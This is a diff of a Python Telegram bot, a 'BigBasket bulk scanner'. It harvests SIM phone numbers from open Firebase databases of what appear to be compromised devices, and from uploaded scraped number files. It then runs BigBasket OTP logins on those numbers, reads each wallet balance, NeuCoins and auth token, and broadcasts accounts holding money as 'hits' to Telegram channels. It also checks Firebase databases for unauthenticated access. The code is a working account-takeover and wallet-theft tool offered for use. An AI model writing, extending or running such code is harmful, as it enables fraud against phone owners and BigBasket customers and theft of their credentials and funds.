-        f"⚡ <b>Scanner Engine:</b> {'🏃 Running (' + str(MAX_SCAN_WORKERS) + ' Workers)' if is_running else '💤 Idle'}\n"
-        f"📊 <b>Progress:</b> {cur_info.get('processed', 0)} / {cur_info.get('total', 0)}\n"
-        f"🔥 <b>Hits Found:</b> {len(cur_info.get('hits', []))}\n"
-        f"🛡️ <b>Client TLS:</b> Chrome120 Native (curl_cffi)\n"
-        f"📢 <b>Log Channel:</b> <code>{esc(get_effective_channel(chat_id))}</code>\n"
-        f"━━━━━━━━━━━━━━━━━━━━━━"
-    )
-    safe_send(chat_id, status_card, reply_markup=main_keyboard())
-
-@bot.message_handler(func=lambda m: m.text == "📊 View Latest Hits")
-@bot.message_handler(commands=["results"])
-def cmd_results(message):
-    chat_id = message.chat.id
-    files = [f for f in os.listdir(RESULTS_DIR) if f.startswith(f"BB_HITS_{chat_id}_")]
-    if not files:
-        files = [f for f in os.listdir(RESULTS_DIR) if f.startswith("BB_HITS_")]
-
-    if not files:
-        safe_send(chat_id, "ℹ️ Abhi tak koi hits save nahi hue hain. Pehle scan run karein!", reply_markup=main_keyboard())
-        return
-
-    files.sort(reverse=True)
-    latest = os.path.join(RESULTS_DIR, files[0])
-    try:
-        with open(latest, "rb") as doc:
-            bot.send_document(
-                chat_id,
-                doc,
-                caption=f"📄 <b>Latest Hits Report:</b> <code>{esc(files[0])}</code>",
-                parse_mode="HTML"
-            )
-    except Exception as e:
-        safe_send(chat_id, f"⚠️ Error sending file: {esc(e)}")
-
-# ============ METHOD 2: FILE UPLOAD HANDLER ============
-@bot.message_handler(content_types=["document"])
-def handle_document_upload(message):
-    chat_id = message.chat.id
-    doc = message.document
-    fname = doc.file_name or "uploaded_file.txt"
-
-    safe_send(chat_id, f"📥 <b>Analyzing file:</b> <code>{esc(fname)}</code>...")
-
-    try:
-        file_info = bot.get_file(doc.file_id)
-        downloaded = bot.download_file(file_info.file_path)
-        save_path = os.path.join(UPLOADS_DIR, f"{chat_id}_{int(time.time())}_{fname}")
-        with open(save_path, "wb") as f:
-            f.write(downloaded)
-
-        with cfg_lock:
-            user_p = user_panels.get(chat_id, [])
-        fallback_p = user_p[0] if user_p else ""
-        targets = parse_scraped_file(save_path, fallback_panel=fallback_p)
-
-        if not targets:
-            safe_send(
-                chat_id,
-                "❌ <b>No valid physical numbers found in the file!</b>\n"
-                "Kripya Dashboard ki <code>clean_numbers_*.txt</code> upload karein.",
-                reply_markup=main_keyboard()
-            )
-            return
-
-        with_meta = sum(1 for t in targets if t.get("dev_id") and t.get("panel"))
-        panels_found = list(set(t.get("panel_name") or t.get("panel") for t in targets if t.get("panel")))
-
-        safe_send(
-            chat_id,
-            f"✅ <b>File Parsed Successfully!</b>\n\n"
-            f"📁 <b>File:</b> <code>{esc(fname)}</code>\n"
-            f"📱 <b>Physical SIM Numbers:</b> <b>{len(targets)}</b>\n"
-            f"⚡ <b>Device ID Linked:</b> <b>{with_meta}/{len(targets)}</b>\n"
-            f"🌐 <b>Panels:</b> {esc(', '.join(panels_found) if panels_found else 'Global/Saved')}\n\n"
-            f"🚀 <i>Launching {MAX_SCAN_WORKERS} parallel BigBasket scan workers...</i>",
-            reply_markup=main_keyboard()
-        )
-
-        threading.Thread(target=run_bulk_scan, args=(chat_id, targets, f"Scraped File ({fname})"), daemon=True).start()
-
-    except Exception as e:
-        safe_send(chat_id, f"❌ <b>Error parsing file:</b> {esc(e)}", reply_markup=main_keyboard())
-
-# ============ METHOD 1: DIRECT PANEL SCANNER ============
-@bot.message_handler(func=lambda m: m.text == "🌐 Direct Firebase Panel Scan")
-@bot.message_handler(commands=["panel"])
-def handle_panel_command(message):
-    chat_id = message.chat.id
-    parts = message.text.split(maxsplit=1)
-
-    if len(parts) > 1:
-        do_panel_scan(chat_id, parts[1].strip())
-    else:
-        with session_lock:
-            user_sessions[chat_id] = {"state": "AWAITING_PANEL"}
-        safe_send(
-            chat_id,
-            "🌐 <b>Firebase Panel URL ya Name bhejein:</b>\n\n"
-            "Examples:\n"
-            "• <code>pani-1da70</code>\n"
-            "• <code>https://pani-1da70-default-rtdb.firebaseio.com</code>\n\n"
-            "Bot panel se live online devices ke <b>Slot 1 & Slot 2 physical numbers</b> nikal kar scan start karega!",
-            reply_markup=cancel_keyboard()
-        )
-
-# ============ MANUAL SINGLE NUMBER CHECK ============
-@bot.message_handler(func=lambda m: m.text == "📱 Check Single Number")
-def prompt_single_number(message):
-    chat_id = message.chat.id
-    with session_lock:
-        user_sessions[chat_id] = {"state": "AWAITING_NUMBER"}
-    safe_send(
-        chat_id,
-        "📲 <b>Kripya 10-digit Indian Mobile Number enter karein:</b>\n(e.g. <code>9899123456</code>)",
-        reply_markup=cancel_keyboard()
-    )
-
-@bot.message_handler(func=lambda m: m.text == "📁 Upload Scraped File")
-def prompt_file_upload(message):
-    safe_send(
-        message.chat.id,
-        "📁 <b>Scraped File Upload Guide:</b>\n\n"
-        "1. Apne Red Glass Dashboard se <code>clean_numbers_*.txt</code>, <code>all_panels_*.txt</code> ya <code>.csv</code> download karein.\n"
-        "2. Use direct chat me <b>Document format me send karein</b>.\n"
-        "3. Bot auto har number ke sath uski <b>Device ID & Panel</b> match karke scan chala dega!",
-        reply_markup=main_keyboard()
-    )
-
-@bot.message_handler(commands=["cancel"])
-@bot.message_handler(func=lambda m: m.text in ["❌ Cancel", "❌ Cancel Session"])
-def handle_cancel(message):
-    chat_id = message.chat.id
-    with session_lock:
-        if chat_id in user_sessions:
-            del user_sessions[chat_id]
-            safe_send(chat_id, "✅ Session cancelled.", reply_markup=main_keyboard())
-        else:
-            safe_send(chat_id, "ℹ️ Koi active session nahi tha.", reply_markup=main_keyboard())
+@bot.message_handler(commands=["help"])
+def cmd_help(message):
+    show_help_menu(message.chat.id)
 
 @bot.message_handler(commands=["check"])
-def handle_check_command(message):
-    chat_id = message.chat.id
+def cmd_check(message):
     parts = message.text.split()
     if len(parts) > 1:
-        start_single_flow(chat_id, parts[1].strip())
+        start_single_flow(message.chat.id, parts[1].strip())
     else:
+        show_single_menu(message.chat.id)
+
+# ============ CALLBACK QUERY ROUTER ============
+@bot.callback_query_handler(func=lambda c: True)
+def handle_callbacks(call):
+    chat_id = call.message.chat.id
+    mid = call.message.message_id
+    data = call.data
+
+    try:
+        bot.answer_callback_query(call.id)
+    except Exception:
+        pass
+
+    # Navigation
+    if data == "start_menu":
         with session_lock:
-            user_sessions[chat_id] = {"state": "AWAITING_NUMBER"}
+            user_sessions.pop(chat_id, None)
+        show_main_menu(chat_id, message_id=mid)
+
+    elif data == "menu_scanner":
+        show_scanner_menu(chat_id, message_id=mid)
+
+    elif data == "menu_panels":
+        show_panels_menu(chat_id, message_id=mid)
+
+    elif data == "menu_channels":
+        show_channels_menu(chat_id, message_id=mid)
+
+    elif data == "menu_export":
+        show_export_menu(chat_id, message_id=mid)
+
+    elif data == "menu_single":
+        show_single_menu(chat_id, message_id=mid)
+
+    elif data == "menu_help":
+        show_help_menu(chat_id, message_id=mid)
+
+    elif data == "cancel_action":
+        with session_lock:
+            user_sessions.pop(chat_id, None)
+        safe_send(chat_id, "✅ Action cancelled.")
+        show_main_menu(chat_id)
+
+    # Scanner Actions
+    elif data == "scan_all_panels":
+        do_scan_all_panels(chat_id)
+
+    elif data == "stop_current_scan":
+        if chat_id in active_scans:
+            active_scans[chat_id]["stop_requested"] = True
+            safe_send(chat_id, "🛑 Stopping scan... Generating report...")
+        else:
+            safe_send(chat_id, "ℹ️ No scan currently active.")
+
+    elif data == "status_btn":
+        show_scanner_menu(chat_id, message_id=mid)
+
+    elif data == "resume_saved_scan":
+        saved = get_saved_scan_state(chat_id)
+        if not saved:
+            safe_send(chat_id, "ℹ️ Koi interrupted scan nahi mila.")
+            show_scanner_menu(chat_id)
+            return
+        safe_send(chat_id, f"▶️ <b>Resuming Scan:</b> <code>{esc(saved.get('scan_title', 'Scan'))}</code>...")
+        threading.Thread(
+            target=lambda: run_bulk_scan(
+                chat_id,
+                saved.get("targets", []),
+                saved.get("scan_title", "BigBasket Bulk Scan"),
+                resume_data=saved
+            ),
+            daemon=True
+        ).start()
+
+    elif data == "discard_saved_scan":
+        clear_scan_state(chat_id)
+        safe_send(chat_id, "🗑️ Interrupted scan discard kar diya gaya.")
+        show_scanner_menu(chat_id)
+
+    # Panels Actions
+    elif data == "add_panel_prompt":
+        with session_lock:
+            user_sessions[chat_id] = {"state": "AWAITING_PANELS"}
+        markup = types.InlineKeyboardMarkup()
+        markup.add(types.InlineKeyboardButton("❌ Cancel", callback_data="cancel_action"))
         safe_send(
             chat_id,
-            "📲 <b>Mobile number enter karein:</b>\nUsage: <code>/check 9899123456</code> ya seedha number bhejein.",
-            reply_markup=cancel_keyboard()
+            "🌐 <b>Firebase Panel URL(s) ya Names enter karein:</b>\n\n"
+            "Aap 1 ya multiple links paste kar sakte hain (single line ya alag alag lines me):\n"
+            "• <code>https://pani-1da70-default-rtdb.firebaseio.com</code>\n"
+            "• <code>axrrrrrrrrrr</code>",
+            reply_markup=markup
         )
 
-def start_single_flow(chat_id: int, raw_number: str):
-    phone = normalize_phone(raw_number)
-    if not phone:
-        safe_send(chat_id, "❌ <b>Invalid Mobile Number!</b> 10-digit number enter karein.", reply_markup=main_keyboard())
-        return
-
-    safe_send(chat_id, f"🔄 <b>Connecting to BigBasket...</b>\nSending OTP to <code>+91 {esc(phone)}</code>...", reply_markup=cancel_keyboard())
-
-    def do_send():
-        bb = BigBasketClient()
-        ok_send, ref_or_err = bb.send_otp(phone)
-        if not ok_send:
-            safe_send(chat_id, f"❌ <b>OTP Send Failed:</b> {esc(ref_or_err)}", reply_markup=main_keyboard())
-            with session_lock:
-                user_sessions.pop(chat_id, None)
+    elif data == "view_panels_list":
+        with cfg_lock:
+            panels = user_panels.get(chat_id, [])
+        if not panels:
+            safe_send(chat_id, "ℹ️ Koi saved panels nahi hain. ➕ Add Panels se add karein.")
+            show_panels_menu(chat_id)
             return
 
-        with session_lock:
-            user_sessions[chat_id] = {
-                "state": "AWAITING_OTP",
-                "phone": phone,
-                "ref_id": ref_or_err,
-                "client": bb,
-                "sent_time": time.time()
-            }
+        lines = [f"<b>Saved Firebase Panels ({len(panels)}):</b>\n"]
+        for idx, p in enumerate(panels, 1):
+            p_short = p.replace("https://", "").replace("-default-rtdb.firebaseio.com", "").replace(".firebaseio.com", "")
+            lines.append(f"{idx}. <code>{esc(p_short)}</code>")
 
+        lines.append("\n👉 Niche kisi bhi panel ko remove karne ya scan karne ke liye buttons dabayein:")
+        markup = types.InlineKeyboardMarkup(row_width=2)
+        for idx, p in enumerate(panels[:8]):
+            p_short = p.replace("https://", "").replace("-default-rtdb.firebaseio.com", "").replace(".firebaseio.com", "")[:15]
+            markup.add(
+                types.InlineKeyboardButton(f"🚀 Scan #{idx+1}", callback_data=f"scan_panel_{p}"),
+                types.InlineKeyboardButton(f"❌ Del #{idx+1}", callback_data=f"del_panel_{idx}")
+            )
+        markup.add(types.InlineKeyboardButton("🔙 Back to Panels Hub", callback_data="menu_panels"))
+        safe_send(chat_id, "\n".join(lines), reply_markup=markup)
+
+    elif data.startswith("del_panel_"):
+        try:
+            del_idx = int(data.replace("del_panel_", ""))
+            with cfg_lock:
+                if chat_id in user_panels and 0 <= del_idx < len(user_panels[chat_id]):
+                    removed = user_panels[chat_id].pop(del_idx)
+                    save_configs()
+                    safe_send(chat_id, f"🗑️ Panel <code>{esc(removed)}</code> delete ho gaya.")
+        except Exception:
+            pass
+        show_panels_menu(chat_id)
+
+    elif data.startswith("scan_panel_"):
+        panel_url = data.replace("scan_panel_", "")
+        do_panel_scan(chat_id, panel_url)
+
+    elif data == "ping_panels":
+        with cfg_lock:
+            panels = user_panels.get(chat_id, [])
+        if not panels:
+            safe_send(chat_id, "ℹ️ Koi panels saved nahi hain.")
+            show_panels_menu(chat_id)
+            return
+
+        safe_send(chat_id, f"🔄 Pinging <b>{len(panels)}</b> panels in parallel...")
+
+        def ping_worker():
+            res_lines = [f"🧪 <b>Firebase Panels Health Ping ({len(panels)} Total):</b>\n"]
+            open_cnt = 0
+            for idx, p in enumerate(panels, 1):
+                fb = resolve_firebase_url(p)
+                p_short = p.replace("https://", "").replace("-default-rtdb.firebaseio.com", "").replace(".firebaseio.com", "")[:18]
+                try:
+                    r = requests.get(f"{fb}/.json?shallow=true", timeout=4)
+                    if r.status_code == 200:
+                        open_cnt += 1
+                        res_lines.append(f"{idx}. 🟢 <code>{esc(p_short)}</code> — <b>OPEN / ACTIVE</b>")
+                    elif r.status_code == 401:
+                        res_lines.append(f"{idx}. 🔒 <code>{esc(p_short)}</code> — Locked (Auth required)")
+                    elif r.status_code == 404:
+                        res_lines.append(f"{idx}. 🔴 <code>{esc(p_short)}</code> — Deactivated (404)")
+                    else:
+                        res_lines.append(f"{idx}. ⚠️ <code>{esc(p_short)}</code> — HTTP {r.status_code}")
+                except Exception:
+                    res_lines.append(f"{idx}. ⏱️ <code>{esc(p_short)}</code> — Timeout / Unreachable")
+
+            res_lines.append(f"\n📊 <b>Summary:</b> <b>{open_cnt}/{len(panels)} Panels Active</b>")
+            markup = types.InlineKeyboardMarkup()
+            markup.add(types.InlineKeyboardButton("🌐 Scan All Now", callback_data="scan_all_panels"))
+            markup.add(types.InlineKeyboardButton("🔙 Back to Panels Hub", callback_data="menu_panels"))
+            safe_send(chat_id, "\n".join(res_lines), reply_markup=markup)
+
+        threading.Thread(target=ping_worker, daemon=True).start()
+
+    elif data == "clear_panels_prompt":
+        markup = types.InlineKeyboardMarkup()
+        markup.add(
+            types.InlineKeyboardButton("✅ Yes, Delete All", callback_data="clear_panels_confirmed"),
+            types.InlineKeyboardButton("❌ Cancel", callback_data="menu_panels")
+        )
+        safe_send(chat_id, "⚠️ <b>Are you sure you want to clear ALL saved panels?</b>", reply_markup=markup)
+
+    elif data == "clear_panels_confirmed":
+        with cfg_lock:
+            user_panels[chat_id] = []
+            save_configs()
+        safe_send(chat_id, "🗑️ All saved panels cleared successfully.")
+        show_panels_menu(chat_id)
+
+    # Channels Actions
+    elif data == "set_log_prompt":
+        with session_lock:
+            user_sessions[chat_id] = {"state": "AWAITING_LOG_CHANNEL"}
+        markup = types.InlineKeyboardMarkup()
+        markup.add(types.InlineKeyboardButton("❌ Cancel", callback_data="cancel_action"))
         safe_send(
             chat_id,
-            f"✅ <b>OTP Sent Successfully!</b>\n\n"
-            f"📱 <b>Mobile:</b> <code>+91 {esc(phone)}</code>\n"
-            f"🔑 <b>Ref ID:</b> <code>{esc(ref_or_err)}</code>\n\n"
-            f"👉 Kripya 6-digit OTP reply me bhejein (Valid for 3 mins):",
-            reply_markup=cancel_keyboard()
+            "📢 <b>Log Channel ID bhejein:</b>\n"
+            "Format: <code>-100xxxxxxxxxx</code>\n\n"
+            "<i>(Bot ko pehle apne channel me Admin zaroor banayein!)</i>",
+            reply_markup=markup
         )
 
-    threading.Thread(target=do_send, daemon=True).start()
+    elif data == "set_storage_prompt":
+        with session_lock:
+            user_sessions[chat_id] = {"state": "AWAITING_STORAGE_CHANNEL"}
+        markup = types.InlineKeyboardMarkup()
+        markup.add(types.InlineKeyboardButton("❌ Cancel", callback_data="cancel_action"))
+        safe_send(
+            chat_id,
+            "📦 <b>Storage Channel ID bhejein:</b>\n"
+            "Format: <code>-100xxxxxxxxxx</code>\n\n"
+            "<i>(Final .txt hit backups is channel me store honge)</i>",
+            reply_markup=markup
+        )
 
-# ============ TEXT / INPUT ROUTER ============
+    elif data == "test_log_ping":
+        log_ch = get_effective_log_channel(chat_id)
+        test_card = (
+            f"🧪 <b>[Test Ping] BigBasket Log Channel Connection OK!</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"🤖 <b>Bot:</b> @mangerbot2423bot\n"
+            f"🕒 <b>Time:</b> {datetime.now().strftime('%d-%m-%Y %H:%M:%S')}\n"
+            f"✅ <i>Live Hit Cards is channel me broadcast honge!</i>"
+        )
+        try:
+            sent = bot.send_message(int(log_ch) if str(log_ch).lstrip("-").isdigit() else log_ch, test_card, parse_mode="HTML")
+            if sent:
+                safe_send(chat_id, f"✅ Test ping successfully sent to Log Channel <code>{esc(log_ch)}</code>!")
+        except Exception as e:
+            safe_send(chat_id, f"❌ Failed to send to Log Channel: {esc(e)}\nMake sure bot is an Admin with post permissions!")
+
+    elif data == "test_storage_ping":
+        storage_ch = get_effective_storage_channel(chat_id)
+        test_msg = (
+            f"📦 <b>[Storage Test Ping] BigBasket Backup Storage OK!</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"🤖 <b>Bot:</b> @mangerbot2423bot\n"
+            f"🕒 <b>Time:</b> {datetime.now().strftime('%d-%m-%Y %H:%M:%S')}\n"
+            f"✅ <i>Final .txt and .csv reports is channel me archive honge!</i>"
+        )
+        try:
+            sent = bot.send_message(int(storage_ch) if str(storage_ch).lstrip("-").isdigit() else storage_ch, test_msg, parse_mode="HTML")
+            if sent:
+                safe_send(chat_id, f"✅ Test ping successfully sent to Storage Channel <code>{esc(storage_ch)}</code>!")
+        except Exception as e:
+            safe_send(chat_id, f"❌ Failed to send to Storage Channel: {esc(e)}\nMake sure bot is an Admin in the channel!")
+
+    # Export Actions
+    elif data == "export_latest_hits":
+        files = [f for f in os.listdir(RESULTS_DIR) if f.startswith(f"BB_HITS_{chat_id}_")]
+        if not files:
+            files = [f for f in os.listdir(RESULTS_DIR) if f.startswith("BB_HITS_")]
+        files.sort(reverse=True)
+        if files:
+            latest = os.path.join(RESULTS_DIR, files[0])
+            try:
+                with open(latest, "rb") as doc:
+                    bot.send_document(
+                        chat_id,
+                        doc,
+                        caption=f"📄 <b>Latest Hits Report:</b> <code>{esc(files[0])}</code>",
+                        parse_mode="HTML"
+                    )
+            except Exception as e:
+                safe_send(chat_id, f"⚠️ Error sending file: {esc(e)}")
+        else:
+            safe_send(chat_id, "ℹ️ No hits reports available.")
+
+    elif data == "upload_prompt":
+        safe_send(
+            chat_id,
+            "📁 <b>Scraped File Upload Guide:</b>\n\n"
+            "1. Apne Red Glass Dashboard se <code>clean_numbers_*.txt</code> ya <code>.csv</code> send karein.\n"
+            "2. Bot auto Phone, Device ID aur Panel mapping read karke scan start karega!"
+        )
+
+# ============ TEXT & DOCUMENT MESSAGE ROUTER ============
+@bot.message_handler(content_types=["document"])
+def handle_document(message):
+    chat_id = message.chat.id
+    doc = message.document
+    safe_send(chat_id, f"📥 <b>Receiving file:</b> <code>{esc(doc.file_name)}</code>...")
+
+    def process_file():
+        try:
+            finfo = bot.get_file(doc.file_id)
+            dcontent = bot.download_file(finfo.file_path)
+            targets = parse_scraped_file(dcontent.decode("utf-8", errors="ignore"))
+
+            if not targets:
+                safe_send(chat_id, "❌ File me koi valid 10-digit Indian numbers nahi mile.")
+                return
+
+            with_device = sum(1 for t in targets if t.get("dev_id") and t.get("panel"))
+            safe_send(
+                chat_id,
+                f"✅ <b>File Parsed Successfully!</b>\n\n"
+                f"📋 <b>Total Numbers:</b> <code>{len(targets)}</code>\n"
+                f"⚡ <b>Firebase Mapped:</b> <code>{with_device}/{len(targets)}</code>\n\n"
+                f"🏎️ Launching {MAX_SCAN_WORKERS} concurrent workers..."
+            )
+            run_bulk_scan(chat_id, targets, f"File ({doc.file_name})")
+        except Exception as e:
+            safe_send(chat_id, f"❌ Error processing file: {esc(e)}")
+
+    threading.Thread(target=process_file, daemon=True).start()
+
 @bot.message_handler(func=lambda message: True)
-def handle_text(message):
+def handle_incoming_text(message):
     chat_id = message.chat.id
     text = (message.text or "").strip()
 
     with session_lock:
         session = user_sessions.get(chat_id)
 
-    # 1. Awaiting Panel Name/URL
-    if session and session.get("state") == "AWAITING_PANEL":
+    # 1. State: Awaiting Panels
+    if session and session.get("state") == "AWAITING_PANELS":
         with session_lock:
             user_sessions.pop(chat_id, None)
-        do_panel_scan(chat_id, text)
+
+        urls = re.findall(r"https?://[^\s/$.?#].[^\s]*", text)
+        if not urls:
+            for line in text.splitlines():
+                cl = line.strip().rstrip(",")
+                if cl and not cl.startswith("#"):
+                    urls.append(cl)
+
+        added = 0
+        with cfg_lock:
+            if chat_id not in user_panels:
+                user_panels[chat_id] = []
+            for u in urls:
+                if u not in user_panels[chat_id]:
+                    user_panels[chat_id].append(u)
+                    added += 1
+            if added > 0:
+                save_configs()
+
+        markup = types.InlineKeyboardMarkup()
+        markup.add(
+            types.InlineKeyboardButton("🌐 Scan All Now", callback_data="scan_all_panels"),
+            types.InlineKeyboardButton("📂 Open Panels Hub", callback_data="menu_panels")
+        )
+        safe_send(
+            chat_id,
+            f"✅ <b>Successfully added {added} new panel(s)!</b>\n"
+            f"📊 <b>Total Panels Loaded:</b> <code>{len(user_panels.get(chat_id, []))}</code>",
+            reply_markup=markup
+        )
         return
 
-    # 2. Awaiting Manual Number
+    # 2. State: Awaiting Log Channel
+    if session and session.get("state") == "AWAITING_LOG_CHANNEL":
+        with session_lock:
+            user_sessions.pop(chat_id, None)
+
+        ch_id = text.strip()
+        if not (ch_id.startswith("-100") or ch_id.startswith("@")):
+            safe_send(chat_id, "❌ Invalid Channel ID! Format should be <code>-100xxxxxxxxxx</code>.")
+            show_channels_menu(chat_id)
+            return
+
+        with cfg_lock:
+            user_channels[chat_id] = ch_id
+            save_configs()
+
+        safe_send(chat_id, f"✅ Log Channel updated to: <code>{esc(ch_id)}</code>!")
+        show_channels_menu(chat_id)
+        return
+
+    # 3. State: Awaiting Storage Channel
+    if session and session.get("state") == "AWAITING_STORAGE_CHANNEL":
+        with session_lock:
+            user_sessions.pop(chat_id, None)
+
+        ch_id = text.strip()
+        if not (ch_id.startswith("-100") or ch_id.startswith("@")):
+            safe_send(chat_id, "❌ Invalid Channel ID! Format should be <code>-100xxxxxxxxxx</code>.")
+            show_channels_menu(chat_id)
+            return
+
+        with cfg_lock:
+            user_storage_channels[chat_id] = ch_id
+            save_configs()
+
+        safe_send(chat_id, f"✅ Storage Channel updated to: <code>{esc(ch_id)}</code>!")
+        show_channels_menu(chat_id)
+        return
+
+    # 4. State: Awaiting Number
     if session and session.get("state") == "AWAITING_NUMBER":
         start_single_flow(chat_id, text)
         return
 
-    # 3. Awaiting Manual OTP
+    # 5. State: Awaiting OTP
     if session and session.get("state") == "AWAITING_OTP":
         otp = re.sub(r"[^\d]", "", text)
         if len(otp) not in (4, 6):
-            safe_send(chat_id, "❌ Kripya valid 4 ya 6-digit OTP enter karein:", reply_markup=cancel_keyboard())
+            safe_send(chat_id, "❌ Valid 4 ya 6-digit OTP enter karein:")
             return
 
         phone = session["phone"]
@@ -1854,44 +2091,39 @@ def handle_text(message):
         def do_verify():
             ok_v, token_or_err, auth_d = bb.verify(phone, otp, ref_id)
             if not ok_v:
-                safe_send(chat_id, f"❌ <b>Login Failed:</b> {esc(token_or_err)}\nDobara koshish karein ya /cancel karein.", reply_markup=cancel_keyboard())
+                safe_send(chat_id, f"❌ <b>Login Failed:</b> {esc(token_or_err)}\nDobara koshish karein ya /start karein.")
                 return
 
             w = bb.wallet()
             tb = w.get("total_balance", 0.0) if w else 0.0
             cb = w.get("current_wallet_balance", 0.0) if w else 0.0
             coins = w.get("neucoins", 0) if w else 0
-            name = w.get("name") if w and w.get("name") else "BigBasket User"
-            ts = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
+            cust_name = w.get("name") if w and w.get("name") else "BigBasket User"
 
-            if tb > 0 or cb > 0 or coins > 0:
-                card = (
-                    f"🎉 <b>🔥 BIGBASKET HIT FOUND!</b>\n"
-                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
-                    f"📱 <b>Mobile:</b> <code>+91 {esc(phone)}</code>\n"
-                    f"👤 <b>Customer:</b> <b>{esc(name)}</b>\n"
-                    f"💰 <b>Total Balance:</b> <b>₹{tb:.2f}</b>\n"
-                    f"🆓 <b>Free Usable Cash:</b> <b>₹{cb:.2f}</b>\n"
-                    f"🪙 <b>NeuCoins:</b> <b>{coins}</b>\n"
-                    f"🔑 <b>Auth Token:</b> <code>{esc(bb.token[:25])}...</code>\n"
-                    f"🕒 <b>Time:</b> <code>{ts}</code>\n"
-                    f"━━━━━━━━━━━━━━━━━━━━━━"
-                )
-            else:
-                card = (
-                    f"✅ <b>Login OK</b> for <code>+91 {esc(phone)}</code> ({esc(name)})\n"
-                    f"💰 Total Balance: ₹0.00 | Free Cash: ₹0.00 | NeuCoins: 0"
-                )
-
+            card = (
+                f"🎉 <b>BIGBASKET WALLET RESULT</b>\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"📱 <b>Mobile:</b> <code>+91 {esc(phone)}</code>\n"
+                f"👤 <b>Name:</b> <b>{esc(cust_name)}</b>\n"
+                f"💰 <b>Total Balance:</b> <b>₹{tb:.2f}</b>\n"
+                f"🆓 <b>Free Cash:</b> <b>₹{cb:.2f}</b>\n"
+                f"🪙 <b>NeuCoins:</b> <b>{coins}</b>\n"
+                f"🔑 <b>Token:</b> <code>{esc(bb.token[:32])}...</code>\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"✅ Checked at: {datetime.now().strftime('%d-%m-%Y %H:%M:%S')}"
+            )
             with session_lock:
                 user_sessions.pop(chat_id, None)
 
-            safe_send(chat_id, card, reply_markup=main_keyboard())
+            safe_send(chat_id, card)
+            if tb > 0 or cb > 0 or coins > 0:
+                broadcast_hit_to_channels(card, chat_id)
+            show_main_menu(chat_id)
 
         threading.Thread(target=do_verify, daemon=True).start()
         return
 
-    # 4. Direct Paste of Firebase URL
+    # 6. Direct Paste of Firebase URL(s)
     if "firebaseio.com" in text or "firebasedatabase.app" in text:
         m_urls = re.findall(r"https?://[^\s/$.?#].[^\s]*", text)
         if m_urls:
@@ -1905,38 +2137,32 @@ def handle_text(message):
                         added += 1
                 if added > 0:
                     save_configs()
-            
-            p_to_scan = m_urls[0]
+
             markup = types.InlineKeyboardMarkup()
-            if len(m_urls) > 1:
-                markup.add(types.InlineKeyboardButton(f"🌐 Scan All {len(m_urls)} Panels Now", callback_data="scan_all_panels"))
             markup.add(
-                types.InlineKeyboardButton(f"🚀 Scan {p_to_scan[:20]}...", callback_data=f"scan_panel_{p_to_scan}"),
-                types.InlineKeyboardButton("⚙️ Open Panel Manager", callback_data="ping_panels")
+                types.InlineKeyboardButton(f"🌐 Scan All ({len(user_panels.get(chat_id, []))} Panels)", callback_data="scan_all_panels"),
+                types.InlineKeyboardButton("📂 Open Panels Hub", callback_data="menu_panels")
             )
             safe_send(
                 chat_id,
-                f"📥 <b>{len(m_urls)} Firebase URL(s) detected & saved!</b>\n"
-                f"Click below to scan immediately:",
+                f"📥 <b>{len(m_urls)} Firebase URL(s) detected & saved to workspace!</b>\n"
+                f"📊 Total Panels Loaded: <code>{len(user_panels.get(chat_id, []))}</code>",
                 reply_markup=markup
             )
             return
 
-    # 5. Direct number input fallback
+    # 7. Direct 10-digit number
     norm = normalize_phone(text)
     if norm:
         start_single_flow(chat_id, norm)
         return
 
-    # 6. Default menu prompt
-    safe_send(
-        chat_id,
-        "ℹ️ <b>10-digit Mobile Number enter karein</b>, <b>Panel URL paste karein</b>, ya <b>Scraped File</b> upload karein:",
-        reply_markup=main_keyboard()
-    )
+    # 8. Default fallback: Open Main Menu
+    show_main_menu(chat_id)
 
+# ============ BOOT RECOVERY & SERVER START ============
 def check_interrupted_scans_on_boot():
-    time.sleep(2)
+    time.sleep(3)
     if not os.path.exists(STATE_DIR):
         return
     for fname in os.listdir(STATE_DIR):
@@ -1947,7 +2173,7 @@ def check_interrupted_scans_on_boot():
                 if saved:
                     proc_cnt = len(saved.get("processed_phones", []))
                     tot_cnt = saved.get("total", len(saved.get("targets", [])))
-                    rem_cnt = tot_cnt - proc_cnt
+                    rem_cnt = max(0, tot_cnt - proc_cnt)
                     if rem_cnt > 0:
                         markup = types.InlineKeyboardMarkup()
                         markup.row(
@@ -1974,13 +2200,12 @@ def start_bot():
   ╔═════════════════════════════════════════════════════════════════════╗
   ║    BIGBASKET ENTERPRISE BULK SCANNER BOT RUNNING                    ║
   ║    Bot: @mangerbot2423bot                                           ║
-  ║    Engine: 5 Concurrent Workers | Multi-Panel Manager | Auto-DM     ║
-  ║    Render 24/7 Keep-Alive: Port {os.environ.get('PORT', '8080')} Active               ║
-  ║    Auto-Recovery: Active Scan State Persistence Enabled             ║
+  ║    Architecture: Full Jio-Bot Inline Hub Engine                     ║
+  ║    Render 24/7 Keep-Alive: Active on Port {os.environ.get('PORT', '8080')}                      ║
+  ║    Scan State Persistence: Enabled                                  ║
   ╚═════════════════════════════════════════════════════════════════════╝
     """)
     bot.infinity_polling(timeout=20, long_polling_timeout=15)
 
 if __name__ == "__main__":
     start_bot()
-
